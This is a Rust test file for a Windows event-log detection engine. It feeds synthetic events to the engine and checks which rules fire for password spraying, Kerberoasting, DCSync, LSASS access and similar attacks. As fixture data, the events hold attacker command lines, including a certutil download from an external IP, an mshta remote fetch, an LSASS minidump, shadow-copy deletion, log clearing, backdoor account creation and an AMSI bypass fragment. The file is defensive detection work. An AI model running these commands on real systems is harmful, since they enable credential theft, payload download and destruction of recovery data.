use super::*;

fn ev(id: u32, channel: &str, provider: &str, data: &[(&str, &str)]) -> Event {
    Event {
        record_id: 1,
        time: "2026-11-09T10:00:00.000000Z".into(),
        event_id: id,
        provider: provider.into(),
        channel: channel.into(),
        computer: "WS01.corp.example".into(),
        data: data.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect(),
        ..Default::default()
    }
}

fn sec(id: u32, data: &[(&str, &str)]) -> Event {
    ev(id, "Security", "Microsoft-Windows-Security-Auditing", data)
}

fn sysmon(id: u32, data: &[(&str, &str)]) -> Event {
    ev(id, "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon", data)
}

fn run(events: &[Event]) -> Report {
    let mut s = State::default();
    for e in events {
        s.event(e);
    }
    s.finish(&evtx::Summary { chunks: 1, records: events.len() as u64, ..Default::default() })
}

fn rule<'a>(r: &'a Report, id: &str) -> Option<&'a Detection> {
    r.detections.iter().find(|d| d.rule == id)
}

#[test]
fn logon_failures_become_guessing_spraying_and_a_suspicious_success() {
    let mut events = Vec::new();
    for _ in 0..12 {
        events.push(sec(4625, &[("TargetUserName", "admin"), ("TargetDomainName", "CORP"), ("IpAddress", "203.0.113.5"), ("LogonType", "3")]));
    }
    for user in ["a", "b", "c", "d", "e", "f"] {
        events.push(sec(4625, &[("TargetUserName", user), ("IpAddress", "198.51.100.9"), ("LogonType", "3")]));
    }
    events.push(sec(4624, &[("TargetUserName", "admin"), ("TargetDomainName", "CORP"), ("IpAddress", "203.0.113.5"), ("LogonType", "3")]));
    events.push(sec(4624, &[("TargetUserName", "WS02$"), ("IpAddress", "203.0.113.5"), ("LogonType", "3")]));
    events.push(sec(4624, &[("TargetUserName", "helpdesk"), ("IpAddress", "192.0.2.4"), ("LogonType", "10")]));
    let r = run(&events);
    let guessing = rule(&r, "EVT-PASSWORD-GUESSING").unwrap();
    assert_eq!((guessing.count, guessing.severity.as_str(), guessing.sources[0].ip.as_str()), (12, "medium", "203.0.113.5 (1 accounts)"));
    let spraying = rule(&r, "EVT-PASSWORD-SPRAYING").unwrap();
    assert_eq!((spraying.severity.as_str(), spraying.technique.as_str()), ("high", "T1110.003 Brute Force: Password Spraying"));
    let after = rule(&r, "EVT-LOGON-AFTER-FAILURES").unwrap();
    assert_eq!(after.count, 1, "the computer account's logon does not count");
    assert!(after.sources[0].examples[0].contains("CORP\\admin logged on (type 3) after 12 failures"), "{:?}", after.sources[0].examples);
    assert_eq!(rule(&r, "EVT-RDP-LOGON").unwrap().sources[0].ip, "helpdesk from 192.0.2.4");
    assert_eq!(r.detections[0].severity, "high", "the most severe first");
    assert_eq!((r.kind.as_str(), r.recognised, r.computers.clone()), ("windows", 21, vec!["WS01.corp.example".to_string()]));
    assert_eq!((r.events[0].id, r.events[0].name.as_str(), r.events[0].count), (4625, "Failed logon", 18));
}

#[test]
fn commands_services_and_tasks() {
    let events = vec![
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"), ("CommandLine", "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"), ("SubjectUserName", "bob"), ("SubjectDomainName", "CORP")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\certutil.exe"), ("CommandLine", "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe C:\\Users\\Public\\a.exe")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\vssadmin.exe"), ("CommandLine", "vssadmin.exe delete shadows /all /quiet")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\wevtutil.exe"), ("CommandLine", "wevtutil cl Security")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\net.exe"), ("CommandLine", "net user backdoor S3cret! /add")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\cmd.exe"), ("CommandLine", "cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1 2>&1"), ("ParentProcessName", "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe")]),
        sysmon(1, &[("Image", "C:\\Windows\\System32\\rundll32.exe"), ("CommandLine", "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\ProgramData\\lsass.dmp full"), ("User", "CORP\\bob")]),
        sysmon(1, &[("Image", "C:\\Windows\\System32\\mshta.exe"), ("CommandLine", "mshta.exe https://203.0.113.9/x.hta")]),
        ev(7045, "System", "Service Control Manager", &[("ServiceName", "WinPwnage"), ("ImagePath", "%COMSPEC% /c ping -n 1 127.0.0.1 >nul && echo 'WinPwnage' > \\\\.\\pipe\\WinPwnagePipe")]),
        ev(7045, "System", "Service Control Manager", &[("ServiceName", "Google Update"), ("ImagePath", "\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /svc")]),
        // a hardware monitor extracts its driver to Temp: worth a look, not a command line
        ev(7045, "System", "Service Control Manager", &[("ServiceName", "HWiNFO Kernel Driver"), ("ImagePath", "C:\\WINDOWS\\TEMP\\HWiNFO_x64_214.sys")]),
        sec(4698, &[("TaskName", "\\CYAlyNSS"), ("SubjectUserName", "Administrator"), ("TaskContent", "<Task><Actions><Exec><Command>cmd.exe</Command><Arguments>/C whoami &gt; %windir%\\Temp\\CYAlyNSS.tmp 2&gt;&amp;1</Arguments></Exec></Actions></Task>")]),
    ];
    let r = run(&events);
    for (id, technique) in [
        ("EVT-ENCODED-POWERSHELL", "T1027"),
        ("EVT-DOWNLOAD-COMMAND", "T1105"),
        ("EVT-RECOVERY-INHIBITED", "T1490"),
        ("EVT-LOG-CLEAR-COMMAND", "T1070.001"),
        ("EVT-ACCOUNT-COMMAND", "T1098"),
        ("EVT-WMI-PROCESS", "T1047"),
        ("EVT-CREDENTIAL-DUMP", "T1003"),
        ("EVT-PROXY-EXECUTION", "T1218"),
        ("EVT-SERVICE-COMMAND", "T1569.002"),
        ("EVT-SERVICE-INSTALLED", "T1543.003"),
        ("EVT-TASK-COMMAND", "T1053.005"),
    ] {
        let d = rule(&r, id).unwrap_or_else(|| panic!("{id} in {:?}", r.detections.iter().map(|d| d.rule.clone()).collect::<Vec<_>>()));
        assert!(d.technique.starts_with(technique), "{id}: {}", d.technique);
    }
    assert_eq!(rule(&r, "EVT-SERVICE-INSTALLED").unwrap().sources[0].ip, "Google Update", "an ordinary service is listed at low severity only");
    // a 4688 without ParentProcessName (Windows before 10): the parent comes from the creator's process ID
    let old = run(&[
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"), ("NewProcessId", "0x0000000000000ae8"), ("ProcessId", "0x248")]),
        sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\calc.exe"), ("NewProcessId", "0x424"), ("ProcessId", "0x0000000000000ae8")]),
    ]);
    assert_eq!(rule(&old, "EVT-WMI-PROCESS").map(|d| d.count), Some(1));
    assert_eq!(rule(&r, "EVT-SERVICE-COMMAND").unwrap().count, 1);
    let writable = rule(&r, "EVT-SERVICE-WRITABLE-FOLDER").unwrap();
    assert_eq!((writable.severity.as_str(), writable.sources[0].ip.as_str()), ("medium", "HWiNFO Kernel Driver"));
    assert_eq!(rule(&r, "EVT-ENCODED-POWERSHELL").unwrap().sources[0].ip, "CORP\\bob");
}

#[test]
fn accounts_groups_kerberos_and_directory_replication() {
    let mut events = vec![
        sec(4720, &[("TargetUserName", "$"), ("TargetDomainName", "CORP"), ("SubjectUserName", "WS9$")]),
        sec(4720, &[("TargetUserName", "jdoe"), ("SubjectUserName", "admin")]),
        sec(4732, &[("TargetUserName", "Administrators"), ("TargetSid", "S-1-5-32-544"), ("MemberSid", "S-1-5-20"), ("MemberName", "-"), ("SubjectUserName", "IEUser")]),
        sec(4728, &[("TargetUserName", "Domain Admins"), ("TargetSid", "S-1-5-21-1-2-3-512"), ("MemberName", "CN=eve")]),
        sec(4732, &[("TargetUserName", "Print Helpers"), ("TargetSid", "S-1-5-21-1-2-3-1104"), ("MemberName", "CN=eve")]),
        sec(4662, &[("SubjectUserName", "Administrator"), ("Properties", "%%7688\r\n\t\t{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}")]),
        sec(4662, &[("SubjectUserName", "DC02$"), ("Properties", "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}")]),
        sec(4768, &[("TargetUserName", "svc_legacy"), ("PreAuthType", "0"), ("IpAddress", "::ffff:10.0.0.7")]),
        sec(4648, &[("ProcessName", "C:\\Windows\\System32\\inetsrv\\w3wp.exe"), ("SubjectUserName", "svc01"), ("TargetUserName", "IEUser"), ("TargetServerName", "localhost")]),
        sec(4648, &[("ProcessName", "C:\\Windows\\System32\\svchost.exe"), ("SubjectUserName", "bob"), ("TargetUserName", "admin"), ("TargetServerName", "FS01.corp.example")]),
        sec(1102, &[("SubjectUserName", "user01")]),
        ev(1102, "Security", "Microsoft-Windows-Eventlog", &[("SubjectUserName", "user01"), ("SubjectDomainName", "CORP")]),
        ev(1116, "Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-Windows Defender", &[("Threat Name", "Trojan:PowerShell/Powersploit.M"), ("Path", "file:_C:\\x.ps1")]),
        sysmon(10, &[("SourceImage", "C:\\Users\\IEUser\\mimikatz.exe"), ("TargetImage", "C:\\Windows\\system32\\lsass.exe"), ("GrantedAccess", "0x00001010")]),
        sysmon(10, &[("SourceImage", "C:\\Windows\\System32\\svchost.exe"), ("TargetImage", "C:\\Windows\\system32\\lsass.exe"), ("GrantedAccess", "0x1fffff")]),
        sysmon(13, &[("TargetObject", "HKU\\S-1-5-21\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\updater"), ("Details", "C:\\Users\\Public\\u.exe"), ("Image", "C:\\Users\\Public\\dropper.exe")]),
        sysmon(13, &[("TargetObject", "HKLM\\System\\CurrentControlSet\\services\\xvq\\ImagePath"), ("Details", "%COMSPEC% /b /c start /b /min powershell.exe -nop"), ("Image", "C:\\Windows\\system32\\services.exe")]),
    ];
    for service in ["MSSQLSvc/db1", "HTTP/web1", "CIFS/fs1", "MSSQLSvc/db2", "HTTP/web2"] {
        events.push(sec(4769, &[("TargetUserName", "eve@CORP.EXAMPLE"), ("ServiceName", service), ("TicketEncryptionType", "0x17"), ("IpAddress", "10.0.0.66")]));
    }
    events.push(sec(4769, &[("TargetUserName", "WS01$@CORP.EXAMPLE"), ("ServiceName", "WS01$"), ("TicketEncryptionType", "0x17")]));
    events.push(sec(4769, &[("TargetUserName", "bob@CORP.EXAMPLE"), ("ServiceName", "HTTP/web1"), ("TicketEncryptionType", "0x12")]));
    let r = run(&events);
    let ids: Vec<&str> = r.detections.iter().map(|d| d.rule.as_str()).collect();
    for id in ["EVT-ACCOUNT-LIKE-COMPUTER", "EVT-ACCOUNT-CREATED", "EVT-PRIVILEGED-GROUP", "EVT-DCSYNC", "EVT-ASREP-ROASTING", "EVT-SERVER-PROCESS-CREDENTIALS", "EVT-EXPLICIT-CREDENTIALS", "EVT-LOG-CLEARED", "EVT-DEFENDER-DETECTION", "EVT-LSASS-ACCESS", "EVT-RUN-KEY", "EVT-SERVICE-REGISTRY", "EVT-KERBEROASTING"] {
        assert!(ids.contains(&id), "{id} in {ids:?}");
    }
    assert_eq!(rule(&r, "EVT-PRIVILEGED-GROUP").unwrap().count, 2, "Print Helpers is not privileged");
    assert_eq!(rule(&r, "EVT-DCSYNC").unwrap().count, 1, "domain controllers replicate");
    assert_eq!(rule(&r, "EVT-LSASS-ACCESS").unwrap().count, 1, "svchost is expected to open lsass");
    let kerb = rule(&r, "EVT-KERBEROASTING").unwrap();
    assert_eq!((kerb.severity.as_str(), kerb.sources[0].ip.as_str()), ("high", "eve@CORP.EXAMPLE (5 services)"));
    assert_eq!(rule(&r, "EVT-LOG-CLEARED").unwrap().count, 1, "1102 counts only from the Eventlog provider that writes it");
}

#[test]
fn scripts_and_obfuscation() {
    let r = run(&[
        ev(4104, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", &[("ScriptBlockText", "$p = Get-Process lsass\n[MiniDump]::MiniDumpWriteDump($p.Handle)"), ("Path", "C:\\Users\\Public\\lsass_wer_ps.ps1")]),
        ev(4104, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", &[("ScriptBlockText", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"), ("Path", "")]),
        ev(4104, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", &[("ScriptBlockText", "$a=(('Q'+'2h')+('w9p'+'1'));&('ne'+'w-'+'item') x;('Sy'+'st'+'em')"), ("Path", "")]),
        ev(4104, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", &[("ScriptBlockText", "Get-ChildItem C:\\"), ("Path", "")]),
    ]);
    assert_eq!(rule(&r, "EVT-CREDENTIAL-DUMP").unwrap().sources[0].ip, "C:\\Users\\Public\\lsass_wer_ps.ps1");
    assert_eq!(rule(&r, "EVT-SUSPICIOUS-SCRIPT").unwrap().count, 1);
    assert_eq!(rule(&r, "EVT-OBFUSCATED-SCRIPT").unwrap().count, 1);
    assert_eq!(r.detections.len(), 3, "an ordinary script block is not reported");
}

#[test]
fn examples_are_redacted_and_bounded() {
    let r = run(&[sec(4688, &[("NewProcessName", "C:\\Windows\\System32\\cmd.exe"), ("CommandLine", &format!("cmd /c certutil -urlcache -f http://x.example/a password=Hunter2Secret {}", "A".repeat(2000)))])]);
    let ex = &rule(&r, "EVT-DOWNLOAD-COMMAND").unwrap().sources[0].examples[0];
    assert!(!ex.contains("Hunter2Secret"), "{ex}");
    assert!(ex.chars().count() <= 401);
}

/// The EVTX-ATTACK-SAMPLES files used to verify the rules (`CYBERHUB_EVTX_DIR`, see the
/// implementation log); not part of the repository.
#[test]
#[ignore]
fn attack_samples_raise_the_expected_detections() {
    let dir = std::path::PathBuf::from(std::env::var("CYBERHUB_EVTX_DIR").expect("CYBERHUB_EVTX_DIR"));
    let expected = [
        ("DE_1102_security_log_cleared.evtx", "EVT-LOG-CLEARED"),
        ("DE_104_system_log_cleared.evtx", "EVT-LOG-CLEARED"),
        ("CA_DCSync_4662.evtx", "EVT-DCSYNC"),
        ("sysmon_10_lsass_mimikatz_sekurlsa_logonpasswords.evtx", "EVT-LSASS-ACCESS"),
        ("Powershell_4104_MiniDumpWriteDump_Lsass.evtx", "EVT-CREDENTIAL-DUMP"),
        ("exec_emotet_ps_4104.evtx", "EVT-SUSPICIOUS-SCRIPT"),
        ("temp_scheduled_task_4698_4699.evtx", "EVT-TASK-COMMAND"),
        ("LM_Remote_Service02_7045.evtx", "EVT-SERVICE-COMMAND"),
        ("System_7045_namedpipe_privesc.evtx", "EVT-SERVICE-COMMAND"),
        ("Network_Service_Guest_added_to_admins_4732.evtx", "EVT-PRIVILEGED-GROUP"),
        ("DE_Fake_ComputerAccount_4720.evtx", "EVT-ACCOUNT-LIKE-COMPUTER"),
        ("WinDefender_Events_1117_1116_AtomicRedTeam.evtx", "EVT-DEFENDER-DETECTION"),
        ("Runas_4624_4648_Webshell_CreateProcessAsUserA.evtx", "EVT-SERVER-PROCESS-CREDENTIALS"),
        ("LM_WMI_4624_4688_TargetHost.evtx", "EVT-WMI-PROCESS"),
        ("sysmon_10_1_memdump_comsvcs_minidump.evtx", "EVT-CREDENTIAL-DUMP"),
        ("LM_sysmon_psexec_smb_meterpreter.evtx", "EVT-SERVICE-REGISTRY"),
    ];
    let mut missed = Vec::new();
    for (file, id) in expected {
        let r = analyze(std::fs::File::open(dir.join(file)).unwrap()).unwrap();
        let got: Vec<String> = r.detections.iter().map(|d| format!("{} ({})", d.rule, d.count)).collect();
        eprintln!("{file}: {}", got.join(", "));
        if !r.detections.iter().any(|d| d.rule == id) {
            missed.push(format!("{file}: {id}"));
        }
    }
    let quiet = analyze(std::fs::File::open(dir.join("CA_4624_4625_LogonType2_LogonProc_chrome.evtx")).unwrap()).unwrap();
    eprintln!("CA_4624_4625_LogonType2_LogonProc_chrome.evtx: {:?}", quiet.detections.iter().map(|d| d.rule.clone()).collect::<Vec<_>>());
    assert!(missed.is_empty(), "missed: {missed:?}");
}
